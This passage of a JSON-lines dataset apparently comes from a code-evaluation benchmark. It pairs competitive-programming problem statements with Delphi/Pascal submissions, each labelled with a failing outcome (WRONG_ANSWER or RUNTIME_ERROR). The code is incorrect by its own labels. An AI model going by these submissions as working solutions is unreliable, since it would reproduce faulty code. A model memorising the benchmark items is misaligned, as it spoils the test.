4\n"],"sample_outputs":["3\n","12\n","4\n"]}
{"difficulty":2000,"lang":"Delphi","lang_cluster":"delphi","src_uid":"58_D","submission_id":"530455","tags":["greedy","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"program Project11;\r\n\r\n{$APPTYPE CONSOLE}\r\n\r\nuses\r\n  SysUtils;\r\n\r\nvar s,s1,s2:string;\r\n    i,j,k,n:integer;\r\n    d:char;\r\n    a:array[1..5000] of string;\r\n    b:array[1..5000] of string;\r\n    c:array[1..5000] of string;\r\nbegin\r\n  { TODO -oUser -cConsole Main : Insert code here }\r\n   readln(n);\r\n    for i:=1 to (n div 2) do\r\n     begin\r\n      readln(a[i]);\r\n      readln(b[i]);\r\n     end;\r\n   readln(d);\r\n    for i:=1 to (n div 2) do\r\n     begin\r\n      s1:=a[i]+d+b[i];\r\n      s2:=a[i]+d+a[i];\r\n       if s1<s2 then\r\n       c[i]:=s1\r\n      else\r\n       c[i]:=s2;\r\n     end;\r\n    for i:=1 to (n div 2) do\r\n     writeln(c[i]);\r\nend.\r\n","description":"BerOilGasDiamondBank has branches in n cities, at that n is an even number. The bank management wants to publish a calendar with the names of all those cities written in two columns: the calendar should consist of exactly n\/2 lines of strictly equal length, each of which contains exactly two names and exactly one separator character between them. The name of every city should be used in the calendar exactly once. For historical reasons the symbol d is used as the separator of words in the calendar. The BerOilGasDiamondBank management wants to show that all its branches are equally important to it, that's why the order of their appearance in the calendar should be following: if we \"glue\"(concatinate) all the n\/2 calendar lines (from top to bottom) to make a single line, then the lexicographically minimal line is obtained. No separator character will be used to separate calendar lines. For example, if the lines are \"bertown!berville\", \"newberville!bera\", then the resulting line is \"bertown!bervillenewberville!bera\". In some sense one has to find the lexicographically minimal calendar, where the comparison of calendars happens line by line.Help BerOilGasDiamondBank and construct the required calendar.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n (1\u2264n\u226410^4, n is even) which is the number of branches. Then follow n lines which are the names of the cities. All the names consist of lowercase Latin letters; their lengths are no less than 1 and no more than 10 symbols. The next line contains a single symbol d (d has an ASCII-code from 33 to 126 inclusively, excluding lowercase Latin letters) which is the separator between words in the calendar lines. It is guaranteed that the calendar is possible to be constructed and all the names are different.\n","output_spec":"Print n\/2 lines of similar length which are the required calendar. Every line should contain exactly two words and exactly one separator between them. If there are several solutions, print the lexicographically minimal one. The lexicographical comparison of lines is realized by the \"<\" operator in the modern programming languages.\n","notes":null,"sample_inputs":["4\nb\naa\nhg\nc\n.\n","2\naa\na\n!\n","2\naa\na\n|\n"],"sample_outputs":["aa.b\nc.hg\n","a!aa\n","aa|a\n"]}
{"difficulty":1700,"lang":"Delphi","lang_cluster":"delphi","src_uid":"66_D","submission_id":"4010307","tags":["constructive+algorithms","math","number+theory"],"exec_outcome":"WRONG_ANSWER","source_code":"program Project1;\r\n\r\n{$APPTYPE CONSOLE}\r\n\r\nuses\r\n  SysUtils,math;\r\n\r\nvar\r\n  f:array[0..50] of int64;\r\n  n:longint;\r\n  i,j:longint;\r\n\r\nbegin\r\n  read(n);\r\n  f[1]:=6;\r\n  f[2]:=10;\r\n  f[3]:=15;\r\n  f[4]:=12;\r\n  if n = 2 then\r\n    write(-1)\r\n  else\r\n  begin\r\n    for i:=1 to min(4,n) do\r\n      write(f[i],' ');\r\n    for i:=5 to n do\r\n      begin\r\n        f[i]:=f[i-1] + 6;\r\n        write(f[i],' ');\r\n      end;\r\n  end;\r\nend.","description":"Little Petya has a birthday soon. Due this wonderful event, Petya's friends decided to give him sweets. The total number of Petya's friends equals to n.Let us remind you the definition of the greatest common divisor: GCD(a1,...,ak)=d, where d represents such a maximal positive number that each ai (1\u2264i\u2264k) is evenly divisible by d. At that, we assume that all ai's are greater than zero.Knowing that Petya is keen on programming, his friends has agreed beforehand that the 1-st friend gives a1 sweets, the 2-nd one gives a2 sweets, ..., the n-th one gives an sweets. At the same time, for any i and j (1\u2264i,j\u2264n) they want the GCD(ai,aj) not to be equal to 1. However, they also want the following condition to be satisfied: GCD(a1,a2,...,an)=1. One more: all the ai should be distinct.Help the friends to choose the suitable numbers a1,...,an.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n (2\u2264n\u226450).\n","output_spec":"If there is no answer, print \"-1\" without quotes. Otherwise print a set of n distinct positive numbers a1,a2,...,an. Each line must contain one number. Each number must consist of not more than 100 digits, and must not contain any leading zeros. If there are several solutions to that problem, print any of them.\nDo not forget, please, that all of the following conditions must be true:\n For every i and j (1\u2264i,j\u2264n): GCD(ai,aj)\u22601 GCD(a1,a2,...,an)=1 For every i and j (1\u2264i,j\u2264n,i\u2260j): ai\u2260aj Please, do not use %lld specificator to read or write 64-bit integers in C++. It is preffered to use cout (also you may use %I64d).\n","notes":null,"sample_inputs":["3\n","4\n"],"sample_outputs":["99\n55\n11115\n","385\n360\n792\n8360\n"]}
{"difficulty":2400,"lang":"Delphi","lang_cluster":"delphi","src_uid":"758_F","submission_id":"24336881","tags":["brute+force","math","number+theory"],"exec_outcome":"RUNTIME_ERROR","source_code":"program ps;  {$Q+ $R+}\r\n\r\nvar i, j, n, x, y, m, l, r: longint;   k: int64;\r\n\r\nfunction nod(a, b: longint): longint;\r\nbegin\r\n    if b = 0 then nod := a else nod := nod(b, a mod b);\r\nend;\r\n\r\nfunction sqrtn(n, r: longint): int64;\r\nvar i, j: longint; b: boolean; k: int64;\r\nbegin\r\n    i := 1; b := true;\r\n    while b do\r\n    begin\r\n        inc(i);\r\n        k := 1;\r\n        for j := 1 to n do\r\n        if k <= r then\r\n        k := k * i;\r\n        b := k <= r;\r\n    end;\r\n    sqrtn := i - 1;\r\nend;\r\n\r\nfunction st(x, n: longint): int64;\r\nvar i, j: longint;\r\nbegin\r\n    j := 1;\r\n    for i := 1 to n do\r\n    j := j * x;\r\n    st := j;\r\nend;\r\n\r\nbegin\r\n    {assign(input, 'input.txt'); reset(input);\r\n    assign(output, 'output.txt'); rewrite(output);}\r\n    read(n, l, r);\r\n    if n < 3 then\r\n    begin\r\n        if n = 1 then write(r - l + 1)\r\n        else write((r - l + 1)*(r - l));\r\n        halt(0);\r\n    end;\r\n    m := sqrtn(n - 1, r);\r\n    k := 0;\r\n    for y := 1 to m do\r\n    for x := y + 1 to m do\r\n    if nod(x, y) = 1 then\r\n    if (r div st(x, n - 1)) - ((l - 1) div st(y, n - 1)) >= 0 then\r\n    k := k + (r div st(x, n - 1)) - ((l - 1) div st(y, n - 1));\r\n    write(k*2);\r\nend.\r\n","description":"For given n, l and r find the number of distinct geometrical progression, each of which contains n distinct integers not less than l and not greater than r. In other words, for each progression the following must hold: l\u2264ai\u2264r and ai\u2260aj , where a1,a2,...,an is the geometrical progression, 1\u2264i,j\u2264n and i\u2260j.Geometrical progression is a sequence of numbers a1,a2,...,an where each term after first is found by multiplying the previous one by a fixed non-zero number d called the common ratio. Note that in our task d may be non-integer. For example in progression 4,6,9, common ratio is .Two progressions a1,a2,...,an and b1,b2,...,bn are considered different, if there is such i (1\u2264i\u2264n) that ai\u2260bi.","input_from":"standard input","output_to":"standard output","input_spec":"The first and the only line cotains three integers n, l and r (1\u2264n\u226410^7,1\u2264l\u2264r\u226410^7).\n","output_spec":"Print the integer K\u00a0\u2014 is the answer to the problem.\n","notes":"These are possible progressions for the first test of examples: \n  1;  2;  3;  4;  5;  6;  7;  8;  9;  10. These are possible progressions for the second test of examples: \n  6,7;  6,8;  6,9;  7,6;  7,8;  7,9;  8,6;  8,7;  8,9;  9,6;  9,7;  9,8. These are possible progressions for the third test of examples: \n  1,2,4;  1,3,9;  2,4,8;  4,2,1;  4,6,9;  8,4,2;  9,3,1;  9,6,4. These are possible progressions for the fourth test of examples: \n  4,6,9;  9,6,4. ","sample_inputs":["1 1 10\n","2 6 9\n","3 1 10\n","3 3 10\n"],"sample_outputs":["10","12","8","2"]}
{"difficulty":2300,"lang":"Delphi","lang_cluster":"delphi","src_uid":"78_E","submission_id":"3667494","tags":["flows","graphs","shortest+paths"],"exec_outcome":"WRONG_ANSWER","source_code":"{$R+,Q+,I+}\r\n{$apptype console}\r\nUses SysUtils;\r\nConst\r\n   cifr=['0'..'9'];\r\nVar\r\n   a,b:Array[0..30,0..30] of Char;\r\n   used,h:Array[0..30,0..30] of Boolean;\r\n   s:Array[0..1000,0..1000] of Boolean;\r\n   used1:Array[0..1000] of Boolean;\r\n   d,d1:Array[0..30,0..30] of Integer;\r\n   q1,q2,mt:Array[0..1000] of Integer;\r\n   i,j,i1,j1,i2,j2,n,t,l,r,x1,y1,x2,x3,ans:Integer;\r\nFunction Kuhn(v:Integer):Boolean;\r\nVar i:Integer;\r\nBegin\r\n   If used1[v] Then Begin\r\n      Kuhn:=false;\r\n      Exit;\r\n   End;\r\n   used1[v]:=true;\r\n   For i:=1 To 900 Do\r\n      If (s[v,i]) and ((mt[i]=-1) or (Kuhn(mt[i]))) Then Begin\r\n         mt[i]:=v;\r\n         Kuhn:=true;\r\n         Exit;\r\n      End;\r\n   Kuhn:=false;\r\nEnd;\r\nBegin\r\n   ReadLn(n,t);\r\n   For i:=1 To n Do Begin\r\n      For j:=1 To n Do Read(a[i,j]);\r\n      ReadLn;\r\n   End;\r\n   ReadLn;\r\n   For i:=1 To n Do Begin\r\n      For j:=1 To n Do Read(b[i,j]);\r\n      ReadLn;\r\n   End;\r\n   x1:=0;\r\n   y1:=0;\r\n   For i:=1 To n Do\r\n      For j:=1 To n Do\r\n         If a[i,j]='Z' Then Begin\r\n            x1:=i;\r\n            y1:=j;\r\n            Break;\r\n         End;\r\n   For i:=1 To n Do\r\n      For j:=1 To n Do d[i,j]:=3000;\r\n   q1[1]:=x1;\r\n   q2[1]:=y1;\r\n   used[x1,y1]:=true;\r\n   d[x1,y1]:=0;\r\n   l:=0;\r\n   r:=1;\r\n   While l<r Do Begin\r\n      l:=l+1;\r\n      For i1:=-1 To 1 Do\r\n         For j1:=-1 To 1 Do\r\n            If abs(i1+j1)=1 Then Begin\r\n               If (q1[l]+i1>0) and (q1[l]+i1<=n) and (q2[l]+j1>0) and (q2[l]+j1<=n) and (a[q1[l]+i1,q2[l]+j1] in cifr) and (not(used[q1[l]+i1,q2[l]+j1])) Then Begin\r\n                  r:=r+1;\r\n                  q1[r]:=q1[l]+i1;\r\n                  q2[r]:=q2[l]+j1;\r\n                  used[q1[r],q2[r]]:=true;\r\n                  d[q1[r],q2[r]]:=d[q1[l],q2[l]]+1;\r\n               End;\r\n            End;\r\n   End;\r\n   For i:=1 To n Do\r\n      For j:=1 To n Do\r\n         If (a[i,j] in cifr) and (a[i,j]<>'0') Then Begin\r\n            For i1:=1 To n Do\r\n               For j1:=1 To n Do used[i1,j1]:=false;\r\n            For i1:=1 To n Do\r\n               For j1:=1 To n Do h[i1,j1]:=false;\r\n            q1[1]:=i;\r\n            q2[1]:=j;\r\n            used[i,j]:=true;\r\n            h[i,j]:=true;\r\n            d1[i,j]:=0;\r\n            l:=0;\r\n            r:=1;\r\n            While l<r Do Begin\r\n               l:=l+1;\r\n               For i1:=-1 To 1 Do\r\n                  For j1:=-1 To 1 Do\r\n                     If abs(i1+j1)=1 Then Begin\r\n                        If (q1[l]+i1>0) and (q1[l]+i1<=n) and (q2[l]+j1>0) and (q2[l]+j1<=n) and (a[q1[l]+i1,q2[l]+j1] in cifr) and (not(used[q1[l]+i1,q2[l]+j1])) and (d1[q1[l],q2[l]]<t) Then Begin\r\n                           If d1[q1[l],q2[l]]>=d[q1[l]+i1,q2[l]+j1] Then Continue;\r\n                           If d1[q1[l],q2[l]]+1=d[q1[l]+i1,q2[l]+j1] Then Begin\r\n                              h[q1[l]+i1,q2[l]+j1]:=true;\r\n                              Continue;\r\n                           End;\r\n                           r:=r+1;\r\n                           q1[r]:=q1[l]+i1;\r\n                           q2[r]:=q2[l]+j1;\r\n                           used[q1[r],q2[r]]:=true;\r\n                           h[q1[r],q2[r]]:=true;\r\n                           d1[q1[r],q2[r]]:=d1[q1[l],q2[l]]+1;\r\n                        End;\r\n                     End;\r\n            End;\r\n            x2:=10*((i-1)*n+j-1)+1;\r\n            For i1:=1 To n Do\r\n               For j1:=1 To n Do\r\n                  If (h[i1,j1]) and (b[i1,j1]<>'0') Then Begin\r\n                     x3:=10*((i1-1)*n+j1-1)+1;\r\n                     For i2:=x2 To x2+strtoint(a[i,j])-1 Do\r\n                        For j2:=x3 To x3+strtoint(b[i1,j1])-1 Do s[i2,j2]:=true;\r\n                  End;\r\n         End;\r\n   For i:=1 To 900 Do mt[i]:=-1;\r\n   ans:=0;\r\n   For i:=1 To 900 Do Begin\r\n      For j:=1 To 900 Do used1[j]:=false;\r\n      If Kuhn(i) Then ans:=ans+1;\r\n   End;\r\n   Write(ans);\r\nEnd.\r\n\r\n\r\n\r\n\r\n\r\n","description":"They've screwed something up yet again... In one nuclear reactor of a research station an uncontrolled reaction is in progress and explosion which will destroy the whole station will happen soon.The station is represented by a square n\u00d7n divided into 1\u00d71 blocks. Each block is either a reactor or a laboratory. There can be several reactors and exactly one of them will explode soon. The reactors can be considered impassable blocks, but one can move through laboratories. Between any two laboratories, which are in adjacent blocks, there is a corridor. Blocks are considered adjacent if they have a common edge.In each laboratory there is some number of scientists and some number of rescue capsules. Once the scientist climbs into a capsule, he is considered to be saved. Each capsule has room for not more than one scientist.The reactor, which is about to explode, is damaged and a toxic coolant trickles from it into the neighboring blocks. The block, which contains the reactor, is considered infected. Every minute the coolant spreads over the laboratories through corridors. If at some moment one of the blocks is infected, then the next minute all the neighboring laboratories also become infected. Once a lab is infected, all the scientists there that are not in rescue capsules die. The coolant does not spread through reactor blocks.There are exactly t minutes to the explosion. Any scientist in a minute can move down the corridor to the next lab, if it is not infected. On any corridor an unlimited number of scientists can simultaneously move in both directions. It is believed that the scientists inside a lab moves without consuming time. Moreover, any scientist could get into the rescue capsule instantly. It is also believed that any scientist at any given moment always has the time to perform their actions (move from the given laboratory into the next one, or climb into the rescue capsule) before the laboratory will be infected.Find the maximum number of scientists who will be able to escape.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and t (2\u2264n\u226410, 1\u2264t\u226460). Each of the next n lines contains n characters. These lines describe the scientists' locations. Then exactly one empty line follows. Each of the next n more lines contains n characters. These lines describe the rescue capsules' locations.\nIn the description of the scientists' and the rescue capsules' locations the character \"Y\" stands for a properly functioning reactor, \"Z\" stands for the malfunctioning reactor. The reactors' positions in both descriptions coincide. There is exactly one malfunctioning reactor on the station. The digits \"0\" - \"9\" stand for the laboratories. In the description of the scientists' locations those numbers stand for the number of scientists in the corresponding laboratories. In the rescue capsules' descriptions they stand for the number of such capsules in each laboratory.\n","output_spec":"Print a single number \u2014 the maximum number of scientists who will manage to save themselves.\n","notes":"In the second sample the events could take place as follows: \n \n","sample_inputs":["3 3\n1YZ\n1YY\n100\n\n0YZ\n0YY\n003\n","4 4\nY110\n1Y1Z\n1Y0Y\n0100\n\nY001\n0Y0Z\n0Y0Y\n0005\n"],"sample_outputs":["2","3"]}
{"difficulty":1700,"lang":"Delphi","lang_cluster":"delphi","src_uid":"84_C","submission_id":"2227418","tags":["binary+search","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"{$R+,Q+,I+}\r\n{$apptype console}\r\nUses SysUtils;\r\nVar\r\n   p1,c1,r1,p2,c2,r2:Array[-30000..30000] of Integer;\r\n   n,i,j,a,b,m,kol:Integer;\r\n   otv:Array[1..10000] of Integer;\r\nBegin\r\n   Read(n);\r\n   For i:=1 To n Do Begin\r\n      Read(a,b);\r\n      For j:=a-b To a+b Do Begin\r\n         If p1[j]=0 Then Begin\r\n            p1[j]:=i;\r\n            c1[j]:=a;\r\n            r1[j]:=b;\r\n         End\r\n         Else Begin\r\n            p2[j]:=i;\r\n            c2[j]:=a;\r\n            r2[j]:=b;\r\n         End;\r\n      End;\r\n   End;\r\n   Read(m);\r\n   For i:=1 To m Do Begin\r\n      Read(a,b);\r\n      If p1[a]<>0 Then Begin\r\n         If ((a-c1[a])*(a-c1[a])+b*b<=r1[a]*r1[a]) and (otv[p1[a]]=0) Then otv[p1[a]]:=i;\r\n         If (p2[a]<>0) and (b=0) and ((a-c2[a])*(a-c2[a])+b*b<=r2[a]*r2[a]) and (otv[p2[a]]=0) Then otv[p2[a]]:=i;\r\n      End;\r\n   End;\r\n   kol:=0;\r\n   For i:=1 To n Do\r\n      If otv[i]=0 Then kol:=kol+1;\r\n   WriteLn(kol);\r\n   For i:=1 To n Do\r\n      If otv[i]<>0 Then Write(otv[i],' ')\r\n                   Else Write(-1,' ');\r\nEnd.\r\n\r\n\r\n\r\n","description":"Perhaps many have heard that the World Biathlon Championship has finished. Although our hero Valera was not present at this spectacular event himself and only watched it on TV, it excited him so much that he decided to enroll in a biathlon section.Of course, biathlon as any sport, proved very difficult in practice. It takes much time and effort. Workouts, workouts, and workouts, \u2014 that's what awaited Valera on his way to great achievements in biathlon.As for the workouts, you all probably know that every professional biathlete should ski fast and shoot precisely at the shooting range. Only in this case you can hope to be successful, because running and shooting are the two main components of biathlon. Valera has been diligent in his ski trainings, which is why he runs really fast, however, his shooting accuracy is nothing to write home about.On a biathlon base where Valera is preparing for the competition, there is a huge rifle range with n targets. Each target have shape of a circle, and the center of each circle is located on the Ox axis. At the last training session Valera made the total of m shots. To make monitoring of his own results easier for him, one rather well-known programmer (of course it is you) was commissioned to write a program that would reveal how many and which targets Valera hit. More specifically, for each target the program must print the number of the first successful shot (in the target), or \"-1\" if this was not hit. The target is considered hit if the shot is inside the circle or on its boundary. Valera is counting on you and perhaps, thanks to you he will one day win international competitions.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input file contains the integer n (1\u2264n\u226410^4), which is the number of targets. The next n lines contain descriptions of the targets. Each target is a circle whose center is located on the Ox axis. Each circle is given by its coordinate of the center x (-2\u00b710^4\u2264x\u22642\u00b710^4) and its radius r (1\u2264r\u22641000). It is guaranteed that no two targets coincide, intersect or are nested into each other, but they can touch each other.\nThe next line contains integer m (1\u2264m\u22642\u00b710^5), which is the number of shots. Next m lines contain descriptions of the shots, which are points on the plane, given by their coordinates x and y (-2\u00b710^4\u2264x,y\u22642\u00b710^4).\nAll the numbers in the input are integers. \nTargets and shots are numbered starting from one in the order of the input.\n","output_spec":"Print on the first line a single number, the number of targets hit by Valera. Print on the second line for each of the targets the number of its first hit or \"-1\" (without quotes) if this number does not exist. Separate numbers with spaces.\n","notes":null,"sample_inputs":["3\n2 1\n5 2\n10 1\n5\n0 1\n1 3\n3 0\n4 0\n4 0\n","3\n3 2\n7 1\n11 2\n4\n2 1\n6 0\n6 4\n11 2\n"],"sample_outputs":["2\n3 3 -1 \n","3\n1 2 4 \n"]}
{"difficulty":2500,"lang":"Delphi","lang_cluster":"delphi","src_uid":"86_C","submission_id":"467570","tags":["dp","string+suffix+structures","trees"],"exec_outcome":"WRONG_ANSWER","source_code":"{$R+,S+,Q+,I+,O-}\r\n{R-,S-,Q-,I-,O+}\r\nconst md = round(1e9+9);\r\n      let: string = 'ACGT';\r\nvar\r\n  ans,ii,jj,kk,max,km,nn,m,n,i,j,t,q,k: longint;\r\n  dd: boolean;\r\n  sw,s: array [0..110] of string;\r\n  ss,st: string;\r\n  a: array [0..110,'A'..'Z'] of longint;\r\n  fn: array [0..110,0..110] of longint;\r\n  word: array [0..110] of boolean;\r\n  pv,de,len: array [0..110] of longint;\r\n  pc: array [0..110] of char;\r\n  f: array [0..1010,0..110,0..11] of longint;\r\nbegin\r\n\/\/  assign(input,'in'); reset(input);\r\n\/\/  assign(output,'out'); rewrite(output);\r\n  readln(nn,m);\r\n  fillchar(a,sizeof(a),0);\r\n  fillchar(word,sizeof(word),False);\r\n  n:=1;\r\n  de[1]:=0;\r\n  for i:=1 to m do\r\n  begin\r\n    readln(s[i]);\r\n    len[i]:=length(s[i]);\r\n    t:=1;\r\n    for j:=1 to len[i] do\r\n    begin\r\n      if a[t,s[i,j]] = 0 then\r\n      begin\r\n        inc(n);\r\n        pv[n]:=t;\r\n        pc[n]:=s[i,j];\r\n        de[n]:=de[t]+1;\r\n        a[t,s[i,j]]:=n;\r\n      end;\r\n      t:=a[t,s[i,j]];\r\n    end;\r\n    word[t]:=True;\r\n  end;\r\n  sw[1]:='';\r\n  for i:=2 to n do sw[i]:=sw[pv[i]]+pc[i];\r\n  dd:=True;\r\n  while dd do\r\n  begin\r\n    dd:=False;\r\n    for i:=1 to n do\r\n      if word[i] then\r\n        for j:=1 to n do\r\n          if not word[j] then\r\n            if length(sw[j]) > length(sw[i]) then\r\n              if Copy(sw[j],length(sw[j])-length(sw[i])+1,length(sw[i])) = sw[i] then\r\n              begin\r\n                word[j]:=True;\r\n                dd:=True;\r\n              end;\r\n  end;\r\n  for i:=1 to n do\r\n    for q:=1 to 4 do\r\n    begin\r\n      st:='';\r\n      t:=i;\r\n      while t > 1 do\r\n      begin\r\n        st:=pc[t]+st;\r\n        t:=pv[t];\r\n      end;\r\n      st:=st+let[q];\r\n      max:=0; km:=1;\r\n      for ii:=2 to n do\r\n      begin\r\n        ss:=''; t:=ii;\r\n        while t > 1 do\r\n        begin\r\n          ss:=pc[t]+ss;\r\n          t:=pv[t];\r\n        end;\r\n        if length(ss) > length(st) then continue;\r\n        if Copy(st,length(st)-length(ss)+1,length(ss)) = ss then\r\n          if length(ss) > max then\r\n          begin\r\n            max:=length(ss);\r\n            km:=ii;\r\n          end;\r\n      end;\r\n      fn[i,q]:=km;\r\n    end;\r\n  fillchar(f,sizeof(f),0);\r\n  f[0,1,0]:=1;\r\n  for i:=0 to nn-1 do\r\n    for j:=1 to n do\r\n      for k:=0 to de[j] do\r\n        if f[i,j,k] > 0 then\r\n          for q:=1 to 4 do\r\n          begin\r\n            ii:=i+1;\r\n            jj:=fn[j,q];\r\n            kk:=k+1;\r\n            if word[jj] and (de[jj] >= k+1) then kk:=0;\r\n            inc(f[ii,jj,kk],f[i,j,k]);\r\n            if f[ii,jj,kk] >= md then dec(f[ii,jj,kk],md);\r\n          end;\r\n  ans:=0;\r\n  for i:=1 to n do ans:=(ans+f[nn,i,0]) mod md;\r\n  writeln(ans);\r\n  close(input);\r\n  close(output);\r\nend.","description":"\"Multidimensional spaces are completely out of style these days, unlike genetics problems\" \u2014 thought physicist Woll and changed his subject of study to bioinformatics. Analysing results of sequencing he faced the following problem concerning DNA sequences. We will further think of a DNA sequence as an arbitrary string of uppercase letters \"A\", \"C\", \"G\" and \"T\" (of course, this is a simplified interpretation).Let w be a long DNA sequence and s1,s2,...,sm \u2014 collection of short DNA sequences. Let us say that the collection filters w iff w can be covered with the sequences from the collection. Certainly, substrings corresponding to the different positions of the string may intersect or even cover each other. More formally: denote by |w| the length of w, let symbols of w be numbered from 1 to |w|. Then for each position i in w there exist pair of indices l,r (1\u2264l\u2264i\u2264r\u2264|w|) such that the substring w[l\u00a0...\u00a0r] equals one of the elements s1,s2,...,sm of the collection.Woll wants to calculate the number of DNA sequences of a given length filtered by a given collection, but he doesn't know how to deal with it. Help him! Your task is to find the number of different DNA sequences of length n filtered by the collection {si}.Answer may appear very large, so output it modulo 1000000009.","input_from":"standard input","output_to":"standard output","input_spec":"First line contains two integer numbers n and m (1\u2264n\u22641000,1\u2264m\u226410) \u2014 the length of the string and the number of sequences in the collection correspondently. \nNext m lines contain the collection sequences si, one per line. Each si is a nonempty string of length not greater than 10. All the strings consist of uppercase letters \"A\", \"C\", \"G\", \"T\". The collection may contain identical strings.\n","output_spec":"Output should contain a single integer \u2014 the number of strings filtered by the collection modulo 1000000009 (10^9+9).\n","notes":"In the first sample, a string has to be filtered by \"A\". Clearly, there is only one such string: \"AA\".\nIn the second sample, there exist exactly two different strings satisfying the condition (see the pictures below).\n \n \n","sample_inputs":["2 1\nA\n","6 2\nCAT\nTACT\n"],"sample_outputs":["1\n","2\n"]}
{"difficulty":2500,"lang":"Delphi","lang_cluster":"delphi","src_uid":"89_D","submission_id":"530866","tags":["geometry"],"exec_outcome":"WRONG_ANSWER","source_code":"{ uses crt;}\r\n   const nn=500; eps=0.000000000001;  besk=1e+10;\r\n   label 1,2;\r\n    type {longint=int64;}   real=double;\r\n    mas=array [0..nn] of longint;   point=record x,y,z:real;end;\r\n        trip=record mx,my,m:real;end;   trip1=^trip;\r\n    coor=record i,j :longint;end; coor1=^coor;\r\n    mass=array[0..nn] of longint;mass1=^mass;\r\n    var ii,mmin,mn,l1,l2,jj,n,k,p,imin,m,s,r,g,b,i1,j1,h,iimax,p1:longint;\r\n    s1,s2:longint;\r\n     v0,v1,s0,t0,t1,t2:real;  mina:array[0..nn] of point;\r\n     minr :array[0..nn] of real; minaship:array[0..nn,0..10] of point;\r\n     zv:point; ppp,vb,aa,bb,vzv:point; ot,t,rzv:real;\r\n     cc:char;  kol:mas;\r\n     a:array[0..nn,0..nn] of char;\r\n\r\n     i,j:longint;\r\n      voz,ub:boolean;\r\n      ss:string;\r\n       flag,flag1:boolean; gvx,gvy,rr:real; sss:array[0..3] of real;\r\n    function al(x,y:real):real; var t0,t1,p,s0,s1:real;\r\n begin\r\n     if (x>0)and(y>=0) then p:=arctan(y\/x);\r\n     if x<0 then p:=pi+arctan(y\/x);\r\n     if(x>0)and(y<0) then p:=2*pi+arctan(y\/x);\r\n     if x=0 then if (y>=0) then p:=pi\/2 else p:=3*pi\/2;\r\n     al:=p\/pi*180;\r\n end;\r\n  function min(x,y:real):real;begin min:=x;if y<x then min:=y; end;\r\n  function max(x,y:longint):longint;begin max:=x;if y>x then max:=y; end;\r\n\r\n  function nod(x,y:longint):longint; var z:longint;\r\nbegin   repeat  z:=x mod y;x:=y;y:=z;   until  z=0 ;  nod:=x;end;\r\n\r\n  function tper(a,b,vb:point;rad:real):real;  label 23;\r\n  var i,j,k:longint; sinn,l1,l2,ch,zn,coss,t,t1,r1:real; c:point;\r\n\r\n  begin\r\n    c.x:=a.x-b.x; c.y:=a.y-b.y;c.z:=a.z-b.z;\r\n   ch:=c.x*vb.x+ c.y*vb.y+c.z*vb.z;\r\n   l1:=sqrt(c.x*c.x+c.y*c.y+c.z*c.z);l2:=sqrt(vb.x*vb.x+vb.y*vb.y+vb.z*vb.z);\r\n   zn:=l1*l2;\r\n   coss:=ch\/zn; if coss<=0 then begin tper:=besk; goto 23;    end;\r\n   {writeln(coss:0:5);}  sinn:=sqrt(1-coss*coss);\r\n   r1:=l1*sinn;  if r1>rad then begin tper:=besk; goto 23;  end;\r\n   t1:=(l1*coss-sqrt(rad*rad-r1*r1))\/l2;\r\n   tper:=t1;\r\n\r\n\r\n\r\n\r\n\r\n23:\r\n  end;\r\n\r\n\r\n     begin   { clrscr;\r\n     assign(input,'input.txt');        reset (input); }\r\n   {  assign(output,'output.txt');        rewrite (output); }\r\n    readln(zv.x,zv.y,zv.z,vzv.x,vzv.y,vzv.z,rzv);\r\n    read(n);\r\n    for i:=1 to n do\r\n     begin\r\n        read(mina[i].x,mina[i].y,mina[i].z,minr[i],kol[i]);\r\n        for j:=1 to kol[i] do read (minaship[i,j].x,minaship[i,j].y,minaship[i,j].z);\r\n\r\n     end;\r\n   {  aa.x:=5;aa.y:=4;bb.x:=-3;bb.y:=4;vb.x:=8;vb.y:=-6;\r\n     t:=tper(aa,bb,vb,5);\r\n     writeln('tt=  ',t:0:7); }  ot:=besk;\r\n   for i:=1 to n do\r\n     begin\r\n        ot:=min(ot,tper(mina[i],zv,vzv,minr[i]+rzv+eps));\r\n       { writeln(i,' ',ot); }\r\n        for j:=1 to kol[i] do\r\n         begin\r\n          ppp.x:=mina[i].x+minaship[i,j].x;\r\n          ppp.z:=mina[i].z+minaship[i,j].z;\r\n          ppp.y:=mina[i].y+minaship[i,j].y;\r\n         { writeln(i,' ',j,' ',tper(ppp,zv,vzv,rzv+eps)) ;\r\n         } ot:=min(ot,tper(ppp,zv,vzv,rzv+eps));\r\n         end;\r\n\r\n     end;\r\n\r\n  if ot<besk-20000000 then writeln(ot:0:6)else write(-1);\r\n\r\n close (output);\r\n\r\n\r\n           end.","description":"Once upon a time in the galaxy of far, far away...Darth Wader found out the location of a rebels' base. Now he is going to destroy the base (and the whole planet that the base is located at), using the Death Star.When the rebels learnt that the Death Star was coming, they decided to use their new secret weapon \u2014 space mines. Let's describe a space mine's build.Each space mine is shaped like a ball (we'll call it the mine body) of a certain radius r with the center in the point O. Several spikes protrude from the center. Each spike can be represented as a segment, connecting the center of the mine with some point P, such that  (transporting long-spiked mines is problematic), where |OP| is the length of the segment connecting O and P. It is convenient to describe the point P by a vector p such that P=O+p.The Death Star is shaped like a ball with the radius of R (R exceeds any mine's radius). It moves at a constant speed along the v vector at the speed equal to |v|. At the moment the rebels noticed the Star of Death, it was located in the point A.The rebels located n space mines along the Death Star's way. You may regard the mines as being idle. The Death Star does not know about the mines' existence and cannot notice them, which is why it doesn't change the direction of its movement. As soon as the Star of Death touched the mine (its body or one of the spikes), the mine bursts and destroys the Star of Death. A touching is the situation when there is a point in space which belongs both to the mine and to the Death Star. It is considered that Death Star will not be destroyed if it can move infinitely long time without touching the mines.Help the rebels determine whether they will succeed in destroying the Death Star using space mines or not. If they will succeed, determine the moment of time when it will happen (starting from the moment the Death Star was noticed).","input_from":"standard input","output_to":"standard output","input_spec":"The first input data line contains 7 integers Ax,Ay,Az,vx,vy,vz,R. They are the Death Star's initial position, the direction of its movement, and its radius (-10\u2264vx,vy,vz\u226410, |v|>0, 0<R\u2264100).\nThe second line contains an integer n, which is the number of mines (1\u2264n\u2264100). Then follow n data blocks, the i-th of them describes the i-th mine.\nThe first line of each block contains 5 integers Oix,Oiy,Oiz,ri,mi, which are the coordinates of the mine centre, the radius of its body and the number of spikes (0<ri<100,0\u2264mi\u226410). Then follow mi lines, describing the spikes of the i-th mine, where the j-th of them describes the i-th spike and 